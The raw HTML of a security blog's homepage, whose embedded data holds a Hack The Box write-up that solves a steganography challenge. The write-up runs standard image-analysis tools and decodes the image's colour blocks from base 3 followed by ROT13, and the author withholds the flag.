<!DOCTYPE html><html><head><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="preconnect" href="https://fonts.gstatic.com" class="jsx-37717e9a7cbc0337"/><link href="https://fonts.gstatic.com/s/firacode/v10/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff" rel="preload" crossorigin="crossorigin" type="font/woff2" as="font" class="jsx-37717e9a7cbc0337"/><link rel="stylesheet" class="jsx-37717e9a7cbc0337" data-href="https://fonts.googleapis.com/css2?family=Fira+Code&amp;display=swap" data-optimized-fonts="true"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TZ2VB384DV" class="jsx-37717e9a7cbc0337"></script><script class="jsx-37717e9a7cbc0337">
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());

            gtag('config', 'G-TZ2VB384DV');
            </script><title>dev.lwlx.xyz | Cybersecurity &amp; Developer blog</title><meta name="description" content="dev.lwlx.xyz publishes articles and research about Cybersecurity, DevOps, Development or just general IT nonsense. "/><meta property="og:image" content="https://dev.lwlx.xyz/lwlzcolors-lawlez-sm.jpg"/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="12"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script defer="" src="/_next/static/chunks/672.d375897fab70a3d2.js"></script><script defer="" src="/_next/static/chunks/478.8d91d35c0e6c86ea.js"></script><script src="/_next/static/chunks/webpack-8465dd2bbe975cad.js" defer=""></script><script src="/_next/static/chunks/framework-4975f770e34de116.js" defer=""></script><script src="/_next/static/chunks/main-22bd8129361cadd1.js" defer=""></script><script src="/_next/static/chunks/pages/_app-fe393028691bebd2.js" defer=""></script><script src="/_next/static/chunks/pages/index-7064aea23bc2e896.js" defer=""></script><script src="/_next/static/cNGqzfdWNKnrcANVGsS_G/_buildManifest.js" defer=""></script><script src="/_next/static/cNGqzfdWNKnrcANVGsS_G/_ssgManifest.js" defer=""></script><script src="/_next/static/cNGqzfdWNKnrcANVGsS_G/_middlewareManifest.js" defer=""></script><style id="__jsx-37717e9a7cbc0337">html, body, #__next{min-height:100%;
font-family:Fira Code, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif}
*{box-sizing:border-box}</style><style data-href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap">@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sFVQ.woff) format('woff')}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV37MOzlojwUKaJO.woff) format('woff');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVT7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVz7MOzlojwUKaJO.woff) format('woff');unicode-range:U+1F00-1FFF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVP7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0370-03FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV77MOzlojwUKaJO.woff) format('woff');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff) format('woff');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 1bd2rq4">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:#fff;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#121212;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#121212;}</style><style data-emotion="css 1ourwbl">.css-1ourwbl{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;min-height:100vh;}</style><div class="MuiBox-root css-1ourwbl"><div style="top:0;width:90%;border-radius:12px;margin-top:14px;margin-bottom:12px;height:48px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;padding:24px;font-size:12pt;font-family:Fira Code;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 11px  rgba(48,48,48, 0.5)"><a href="/" style="text-decoration:none"><p style="color:#F07693">dev.lwlx.xyz</p></a><div style="flex:1"></div><a href="https://github.com/Lawlez/myOSWE" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true" style="margin-right:-12px"><path fill="#F07693" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg><p style="padding:0px 1em;color:#F07693">GitHub</p></a><a href="https://twitter.com/0x0000005" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 24 24" style="margin-right:-12px"><g><path fill="#F07693" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg><p style="padding:0px 1em;color:#F07693">Twitter</p></a></div><style data-emotion="css 5csqms">.css-5csqms{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;}@media (min-width:1200px){.css-5csqms{max-width:1200px;}}</style><div class="MuiContainer-root MuiContainer-maxWidthLg MuiContainer-disableGutters css-5csqms"><style data-emotion="css 8atqhb">.css-8atqhb{width:100%;}</style><div class="MuiBox-root css-8atqhb"><style data-emotion="css wbadjo">.css-wbadjo{width:100%;padding:100px 3vw;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}</style><div class="MuiBox-root css-wbadjo"><h2 style="margin:4px 0px;font-size:32pt">newest posts</h2><style data-emotion="css ujuwb5">.css-ujuwb5{width:100%;left:24px;position:relative;margin-top:64px;}</style><div class="MuiBox-root css-ujuwb5"><style data-emotion="css 1wzejgz">.css-1wzejgz{width:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-flex-flow:column wrap;-webkit-flex-flow:column wrap;-ms-flex-flow:column wrap;flex-flow:column wrap;-webkit-align-content:space-between;-ms-flex-line-pack:space-between;align-content:space-between;box-sizing:border-box;margin:-24px;}.css-1wzejgz>*{box-sizing:border-box;margin:24px;}@media (min-width:0px){.css-1wzejgz>*{width:calc(100.00% - 48px);}}@media (min-width:600px){.css-1wzejgz>*{width:calc(50.00% - 48px);}}@media (min-width:900px){.css-1wzejgz>*{width:calc(33.33% - 48px);}}@media (min-width:1536px){.css-1wzejgz>*{width:calc(25.00% - 48px);}}</style><div class="MuiMasonry-root css-1wzejgz"></div></div></div><div class="MuiBox-root css-wbadjo"><h2 style="margin:4px 0px;font-size:32pt">All Posts</h2><div class="MuiBox-root css-ujuwb5"><div class="MuiMasonry-root css-1wzejgz"></div></div></div><style data-emotion="css 4wvnz5">.css-4wvnz5{width:100%;padding:32px 3vw;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}</style><div class="MuiBox-root css-4wvnz5"><h2 style="text-align:center;font-size:34pt">Open Source Security &amp; Dev Blog</h2><p style="text-align:center;max-width:960px;margin:auto;line-height:1.7">dev.lwlx.xyz is a blog focused on Cybersecurity and the occasional code project.</p><br/><a href="https://twitter.com/0x0000005" style="cursor:pointer"><button style="box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 12px  rgba(68,68,68, 0.5);padding:10px 30px;background-color:#141414;color:#F07693;font-size:14pt;border:none;border-radius:8px;cursor:pointer;background:linear-gradient(135deg, rgb(12,12,12,0.6), rgba(28,28,28, 0.5))">@0x0000005 on twitter</button></a></div></div></div><style data-emotion="css 1rr4qq7">.css-1rr4qq7{-webkit-flex:1;-ms-flex:1;flex:1;}</style><div class="MuiBox-root css-1rr4qq7"></div><div style="top:0;width:90%;border-radius:12px;margin-bottom:12px;height:56px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;color:#F07693;padding:24px;font-size:12pt;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 12px  rgba(48,48,48, 0.5)"><p>© lwlx. 2022</p><a href="https://twitter.com/0x0000005"><svg height="24" viewBox="0 0 24 24"><g><path fill="#fff" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg></a><div id="htbadge"></div><a href="https://github.com/Lawlez"><svg height="24" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill="#fff" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg></a><p>Version <!-- -->0.7.4</p></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"introduction":"empty for now :)","posts":[{"path":"blog/htb-not-art-challenge","title":"HTB write up for the Not Art[HARD] challenge","subtitle":"stegonagraphy is easy?","published":true,"datePublished":1643383870315,"tags":["ctf","writeup","hackthebox","NotArt","htb","stego"],"description":"write up for the Not Art[HARD] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/htb-not-art-challenge","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/htb/notart/htb-not-art","thumbnailPhoto":"/htb/notart/htb-not-art-thumb.jpg","content":"\nThis is my Write Up for the \"Not Art\" Stego challenge from Hack The Box.\n# Not Art\n\nWe Recvied a PNG file called not_art.png\n\n![not_art.png](/htb/notart/not_art.png)\n\nWe already know there is something hidden in this image so lets start with basic stego tools to analyze if we have hidden content.\n\nsteghide \u0026 foremost:\n\n```bash\nsteghide info not_art.png \nsteghide: the file format of the file \"not_art.png\" is not supported.\n                                                                                                                                            \n└─$ foremost -i not_art.png                                                                                                             1 ⨯\nProcessing: not_art.png\n```\n\nnothing so lets check further:\n\n```bash\n└─$ strings not_art.png      \nIHDR\nJIDATx\nO2~tt\nkNB(\nB([W\n3\"qV\n!.'!\nBf-#\neG=1w\n\u0026=1{Rl4\n-Tg~\n+,:\nk22s\n(;-A\n3fM!\nLjb\u0026\n=bNB(\nB([O}-;\n\u003e;m];\n9eNB(\nIEND\n```\n\n```bash\n└─$ exiftool not_art.png                                                                                                              127 ⨯\nExifTool Version Number         : 12.39\nFile Name                       : not_art.png\nDirectory                       : .\nFile Size                       : 2.1 KiB\nFile Modification Date/Time     : 2018:06:20 19:04:12+02:00\nFile Access Date/Time           : 2022:01:25 14:00:23+01:00\nFile Inode Change Date/Time     : 2022:01:25 14:00:21+01:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 300\nImage Height                    : 300\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nImage Size                      : 300x300\nMegapixels                      : 0.090\n```\n\n```bash\nzsteg -a not_art.png  \nb1,r,lsb,xy         .. file: , OEM-ID \"\\003\\377\", Bytes/sector 3840, sectors/cluster 252, sectors 65280 (volumes \u003c=32 MB), Media descriptor 0xff, sectors/FAT 240, sectors/track 0, FAT (12 bit by descriptor)                                                                          \nb2,b,lsb,xy         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb2,b,msb,xy         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb6,r,lsb,xy         .. file: AIX core file fulldump\nb1,rgb,lsb,xy,prime .. text: \"lHR\u0026I\\\"Z$\"\nb1,rgb,msb,xy,prime .. text: \"D\u0026IlIK\\\"i\\\"I)6\"\nb3,r,lsb,xy,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb4,g,lsb,xy,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,g,msb,xy,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb5,g,lsb,xy,prime   .. file: AIX core file\nb8,b,lsb,xy,prime   .. file: Matlab v4 mat-file (little endian) \\300\\300\\377\\377\\377\\300\\300\\300\\300, numeric, rows 3233857728, columns 3233808384, imaginary                                                                                                                           \nb1,g,msb,yx         .. file: dBase III DBT, next free block index 1072693248, block length 64512, 1st item \"\\001\"\nb2,b,lsb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\360, numeric, rows 251658240, columns 65535, imaginary\nb2,b,msb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\017, numeric, rows 4026531840, columns 65535, imaginary\nb5,b,lsb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 0, columns 0\nb5,b,msb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 0, columns 0\nb6,r,lsb,yx         .. file: AIX core file fulldump\nb6,g,lsb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\360, numeric, rows 0, columns 0, imaginary\nb6,g,msb,yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\017, numeric, rows 0, columns 0, imaginary\nb7,b,lsb,yx         .. file: Matlab v4 mat-file (little endian) @\\201\\002\\004\\010\\020?\\377\\377\\377\\377\\377\\377\\377\\377, numeric, rows 0, columns 0                                                                                                                                      \nb8,b,lsb,yx         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb1,rgb,msb,yx,prime .. file: TeX font metric data\nb2,r,msb,yx,prime   .. file: DOS 2.0-3.2 backed up file \\017\\003\nb3,r,lsb,yx,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb4,r,msb,yx,prime   .. file: , Bytes/sector 3840, root entries 15, Media descriptor 0xff, sectors/FAT 255, sectors/track 0, heads 15, FAT (12 bit by descriptor)                                                                                                                        \nb8,b,lsb,yx,prime   .. file: Matlab v4 mat-file (little endian) \\300\\300\\377\\377, numeric, rows 0, columns 4294951104, imaginary\nb3,r,lsb,XY         .. file: AIX core file\nb3,g,lsb,XY         .. file: AIX core file\nb4,r,lsb,XY         .. file: Matlab v4 mat-file (little endian) , numeric, rows 4294967040, columns 65535\nb6,b,lsb,XY         .. file: AIX core file fulldump\nb3,b,lsb,XY,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz, stereo + center\nb4,r,lsb,XY,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,r,msb,XY,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,g,lsb,XY,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,g,msb,XY,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb8,g,lsb,XY,prime   .. file: Matlab v4 mat-file (little endian) \\300\\300\\377\\377, numeric, rows 4294967295, columns 0, imaginary\nb3,r,lsb,YX         .. file: AIX core file\nb6,g,lsb,YX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\360, numeric, rows 0, columns 0, imaginary\nb6,g,msb,YX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\017, numeric, rows 0, columns 0, imaginary\nb6,b,lsb,YX         .. file: AIX core file fulldump\nb7,g,lsb,YX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377\\377\\340@\\201\\002\\004\\010\\020 @\\377\\377\\377\\377\\377\\377\\377\\377\\376\\004\\010\\020 @\\201\\002\\004, numeric, rows 0, columns 0                                                                           \nb7,g,msb,YX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377\\377\\007\\002\\201@ \\020\\010\\004\\002\\377\\377\\377\\377\\377\\377\\377\\377\\177 \\020\\010\\004\\002\\201@ , numeric, rows 0, columns 0                                                                           \nb8,g,lsb,YX         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb8,g,msb,YX         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb1,rgb,msb,YX,prime .. text: \"-!%\u00266l2\\t%\"\nb3,b,lsb,YX,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb4,r,lsb,YX,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,r,msb,YX,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb6,g,lsb,YX,prime   .. file: Matlab v4 mat-file (little endian) \\377\\374\\017\\300, numeric, rows 4043243520, columns 3238002432\nb6,g,msb,YX,prime   .. file: Matlab v4 mat-file (little endian) \\377?\\360\\003, numeric, rows 268369920, columns 67108608\nb2,r,lsb,Xy         .. file: AIX core file\nb4,bgr,msb,Xy       .. file: MPEG ADTS, AAC, v4 Main, 48 kHz, surround + side\nb6,g,lsb,Xy         .. file: AIX core file fulldump\nb6,b,lsb,Xy         .. file: AIX core file fulldump\nb6,bgr,lsb,Xy       .. file: MPEG ADTS, AAC, v4 Main, surround + side\nb7,bgr,lsb,Xy       .. file: MPEG ADTS, layer II, v1, 48 kHz, Monaural\nb1,bgr,lsb,Xy,prime .. text: \"I\\\"Ki$q%)\"\nb3,g,lsb,Xy,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb3,b,lsb,Xy,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb4,r,lsb,Xy,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,r,msb,Xy,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,g,lsb,Xy,prime   .. file: , Bytes/sector 3840, sectors/cluster 255, reserved sectors 4095, FATs 255, root entries 240, sectors 61455 (volumes \u003c=32 MB), Media descriptor 0xff, sectors/FAT 65535, sectors/track 65535, hidden sectors 4042326015, sectors 4278255360 (volumes \u003e 32 MB), dos \u003c 4.0 BootSector (0), FAT (12 bit by descriptor)                                                                                     \nb4,bgr,msb,Xy,prime .. file: MPEG ADTS, AAC, v4 Main, 48 kHz, surround + side\nb6,r,lsb,Xy,prime   .. file: AIX core file\nb6,bgr,lsb,Xy,prime .. file: MPEG ADTS, AAC, v4 Main, surround + side\nb7,bgr,lsb,Xy,prime .. file: MPEG ADTS, layer II, v1, 48 kHz, Monaural\nb4,bgr,msb,yX       .. file: MPEG ADTS, AAC, v4 Main, 48 kHz, surround + side\nb5,r,lsb,yX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 0, columns 0\nb5,r,msb,yX         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 0, columns 0\nb6,g,lsb,yX         .. file: AIX core file fulldump\nb6,b,lsb,yX         .. file: AIX core file fulldump\nb6,bgr,lsb,yX       .. file: MPEG ADTS, AAC, v4 Main, surround + side\nb7,r,lsb,yX         .. file: Matlab v4 mat-file (little endian) @\\201\\002\\004\\010\\020?\\377\\377\\377\\377\\377\\377\\377\\377, numeric, rows 0, columns 0                                                                                                                                      \nb7,bgr,lsb,yX       .. file: MPEG ADTS, layer II, v1, 48 kHz, Monaural\nb8,r,lsb,yX         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb1,bgr,lsb,yX,prime .. \u003cwbStego size=24795, data=\"\\x99\\\"II$-\\xB7\\x01\u0026%\"..., even=false, enc=\"wbStego 2.x/3.x\", mix=true, controlbyte=\"\\xD8\"\u003e\nb3,g,lsb,yX,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz, stereo + center\nb3,b,lsb,yX,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz, stereo + center\nb4,g,lsb,yX,prime   .. file: , Bytes/sector 3840, sectors/cluster 255, reserved sectors 240, root entries 61455, sectors 61455 (volumes \u003c=32 MB), Media descriptor 0xff, sectors/FAT 255, sectors/track 0, heads 15, hidden sectors 4026593295, sectors 4278190080 (volumes \u003e 32 MB), physical drive 0xf0, dos \u003c 4.0 BootSector (0), FAT (12 bit by descriptor)                                                                     \nb4,bgr,msb,yX,prime .. file: MPEG ADTS, AAC, v4 Main, 48 kHz, surround + side\nb5,r,lsb,yX,prime   .. file: Matlab v4 mat-file (little endian) \\377\\300, numeric, rows 4030660608, columns 0, imaginary\nb5,r,msb,yX,prime   .. file: Matlab v4 mat-file (little endian) \\377\\003, numeric, rows 268173312, columns 0, imaginary\nb6,r,lsb,yX,prime   .. file: Matlab v4 mat-file (little endian) \\377\\374, numeric, rows 251658240, columns 255\nb6,r,msb,yX,prime   .. file: Matlab v4 mat-file (little endian) \\377?, numeric, rows 4026531840, columns 255\nb6,bgr,lsb,yX,prime .. file: MPEG ADTS, AAC, v4 Main, surround + side\nb7,bgr,lsb,yX,prime .. file: MPEG ADTS, layer II, v1, 48 kHz, Monaural\nb2,g,lsb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 4294967040, columns 65535, imaginary\nb2,g,msb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377, numeric, rows 4294967040, columns 65535, imaginary\nb3,r,lsb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\360, numeric, rows 0, columns 0\nb3,r,msb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\017, numeric, rows 0, columns 0\nb3,b,lsb,xY         .. file: AIX core file fulldump\nb6,g,lsb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377\\377\\377\\377\\377\\377, numeric, rows 0, columns 0, imaginary                                                                                                                                         \nb6,g,msb,xY         .. file: Matlab v4 mat-file (little endian) \\377\\377\\377\\377\\377\\377\\377\\377\\377\\377, numeric, rows 0, columns 0, imaginary                                                                                                                                         \nb7,r,lsb,xY         .. file: Matlab v4 mat-file (little endian) @\\201\\002\\004\\010\\020, numeric, rows 0, columns 0\nb8,r,lsb,xY         .. file: Matlab v4 mat-file (little endian) , numeric, rows 0, columns 0\nb1,r,lsb,xY,prime   .. file: raw G3 (Group 3) FAX, byte-padded\nb6,r,lsb,xY,prime   .. file: Matlab v4 mat-file (little endian) \\377\\374, numeric, rows 0, columns 1056964608, imaginary\nb6,r,msb,xY,prime   .. file: Matlab v4 mat-file (little endian) \\377?, numeric, rows 0, columns 4227858432, imaginary\nb2,r,lsb,Yx         .. file: AIX core file\nb6,g,lsb,Yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\360, numeric, rows 0, columns 0, imaginary\nb6,g,msb,Yx         .. file: Matlab v4 mat-file (little endian) \\377\\377\\017, numeric, rows 0, columns 0, imaginary\nb6,b,lsb,Yx         .. file: AIX core file fulldump\nb3,b,lsb,Yx,prime   .. file: MPEG ADTS, AAC, v4 Main, 96 kHz\nb4,r,lsb,Yx,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,r,msb,Yx,prime   .. file: Common Data Format (Version 2.5 or earlier) data\nb4,g,lsb,Yx,prime   .. file: Matlab v4 mat-file (little endian) \\360\\377\\377\\017\\377, numeric, rows 255, columns 16715520, imaginary\nb6,r,lsb,Yx,prime   .. file: AIX core file\n[!] possible image block size is 10x10, downscaling may be necessary\n```\n\nso except for zsteg nothing seems to have found anything of interest. having a closer look at zsteg also reveals there seems to be nothing of use.\n\n## hidden in plain sight\n\nSo we have a very special image here, its a spiral of blocks of colors, they also seem to be repeating, maybe there is some conversion going on from rgb → ascii, lets check that.\n\nextracting the color codes yields us a pattern:\n\n```bash\n[(255, 192, 0), (0, 255, 192), (192, 255, 0), (255, 255, 192), (255, 0, 0), ... ]\n```\n\nit seems there are only three possible options per color: 192, 255 or 0. so really we are looking at a base3 encoded data.\n\nif we convert the first few bytes to base3 we get a series of numbers, if we convert those to ascii we get the following: \n\n**Substitute 0, 192, 255 to 0, 1, 2**\n\n**Concatenate the values to get a 3-digits number (BASE 3)**\n\n**Convert the 3 digits number into base 10 number**\n\n```bash\n21 = u\n7 = g\n15 = o\n25 = y\n18 = r\n```\n\nif you have played a few CTF’s you might be able to tell that “ugo” is “HTB” in ROT13, so lets see what happens if we apply a ROT 13 to the whole text after base3 conversion.\n\n```bash\n21 h\n7 t\n15 b\n25 l\n18 e\n19 f\n7 t\n16 c\n8 u\n5 r\n25 l\n12 y\n15 b\n5 r\n14 a\n16 c\n```\n\nWell this seems to be it! here we got our plaintext flag, now we just need to convert it, i guess.\n\nhtbleftcurlybracketuppercaseiunderscorelowercasetuppercaseolowercaseluppercasedunderscorelowercaseyuppercaseolowercaseuunderscoreuppercasetlowerc.....owercaseruppercasetunderscorelowercasenuppercaseolowercaserunderscoreuppercaseplowercaseiuppercaseelowercasetexclamationmarkexclamationmarkrightcurlybracketeof\n\n`HTB{SORRY I DONT PUBLISH FLAGS}`\n\nyay got em!"},{"path":"blog/filesharing-for-pentesters","title":"Quick filesharing techniques for Pentesters","subtitle":"sharing files can be done in various 